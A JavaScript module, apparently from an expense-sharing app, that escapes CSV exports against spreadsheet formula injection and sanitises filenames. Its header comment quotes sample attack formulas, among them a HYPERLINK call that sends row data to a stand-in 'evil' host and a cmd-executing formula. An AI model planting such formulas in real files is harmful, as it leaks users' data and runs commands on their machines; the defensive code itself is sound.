/**
 * Building a CSV file that is safe to open.
 *
 * ## The part that is not about commas
 *
 * A spreadsheet treats a cell beginning `=`, `+`, `-` or `@` as a **formula**, and
 * opens it by evaluating it. `=HYPERLINK("https://evil/"&A1,"Click")` in a
 * description column becomes a live link carrying the row beside it; older Excel
 * will run `=cmd|'/c calc'!A0` outright.
 *
 * That matters more here than in the sheet export, and the difference is who wrote
 * the text. A sheet's CSV contains what its own owner typed. A group's export
 * contains descriptions, notes and names typed by **other members** — anyone
 * holding an invite link. So the threat is ordinary: someone adds an expense
 * called `=IMPORTXML(...)`, a flatmate exports the month, and their spreadsheet
 * makes a request on the attacker's behalf.
 *
 * The fix is one apostrophe. Excel, LibreOffice and Sheets all treat a leading `'`
 * as "this is text", strip it on display, and never evaluate what follows. It is
 * applied to *text* fields only — `number()` exists precisely so that amounts,
 * which legitimately start with `-`, never pass through it.
 *
 * ## Why this file has no notion of an expense
 *
 * It takes columns and rows and returns a string. Keeping it free of any domain
 * type is what lets it be tested exhaustively against the two things that actually
 * break CSV — a quote inside a quoted field, and a formula prefix — without
 * constructing a group to do it.
 */

/**
 * The characters a spreadsheet reads as "a formula follows".
 *
 * Tab and carriage return are in the list because Excel strips leading whitespace
 * before deciding, so a value beginning tab-then-equals is still a formula.
 */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * One value, escaped for CSV and defanged for spreadsheets.
 *
 * Quoting and formula-guarding are separate concerns and both apply: a quoted
 * field is still evaluated, so `"=1+1"` is a formula in every major spreadsheet.
 */
const cell = (value) => {
  let text = String(value ?? "");

  if (FORMULA_START.test(text)) text = `'${text}`;

  // Quote whenever the value could otherwise break the row apart, doubling any
  // quote inside it — the one rule CSV actually has.
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
};

/**
 * A number, written the way a spreadsheet will read it back as a number.
 *
 * No currency symbol, no thousands separator, and **not** formula-guarded — a
 * negative amount has to stay negative, and it is safe precisely because it went
 * through here rather than through `cell`. Anything that is not finite becomes an
 * empty cell rather than `NaN`, which imports as text and poisons a column's sum.
 */
const number = (value, decimals = 2) => {
  /**
   * Absence is checked before conversion, because `Number(null)`, `Number("")` and
   * `Number([])` are all **0** — a finite, plausible-looking zero. Left to
   * `isFinite`, a missing amount would export as `0.00`, which is not "we don't
   * know" but "they owed nothing", and it would sum.
   */
  if (value === null || value === undefined || value === "") return "";

  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed.toFixed(decimals) : "";
};

/**
 * Rows of already-escaped values → the file.
 *
 * CRLF because that is what the RFC says and what Excel is happiest with, and a
 * trailing newline so appending or counting lines behaves.
 */
const toCsv = (headers, rows) =>
  [headers.map(cell).join(","), ...rows.map((row) => row.join(","))].join("\r\n") + "\r\n";

/**
 * The bytes to send, with the byte-order mark Excel needs.
 *
 * Without it Excel opens a UTF-8 file in the local ANSI codepage, so every ₹ and
 * every accented name arrives as mojibake — and opening it in Excel is the first
 * thing anybody does with an export.
 */
const toCsvBuffer = (headers, rows) => Buffer.from(`﻿${toCsv(headers, rows)}`, "utf8");

/**
 * A filename that survives every operating system.
 *
 * An **allow-list**, not a list of banned characters. The name carries a group's
 * title, which is user input on its way into a `Content-Disposition` header and a
 * filesystem — and the banned-character approach has to enumerate every path
 * separator, every Windows reserved character and every control byte correctly, in
 * one regex, forever. Naming what may pass is shorter and fails closed.
 *
 * Letters, digits, spaces and a handful of harmless punctuation get through;
 * everything else becomes a hyphen.
 */
const safeFilename = (name, extension) => {
  const cleaned = String(name || "export")
    .replace(/[^\p{L}\p{N} .,'()&+#_-]/gu, "-")
    // A leading dot hides the file on Unix; a trailing one confuses Windows.
    .replace(/^[.\s]+/, "")
    .replace(/[.\s]+$/, "")
    // Collapsed, so a title of only spaces cannot survive as a name.
    .replace(/\s+/g, " ")
    .slice(0, 80)
    .trim();

  return `${cleaned || "export"}.${extension}`;
};

module.exports = { cell, number, toCsv, toCsvBuffer, safeFilename, FORMULA_START };
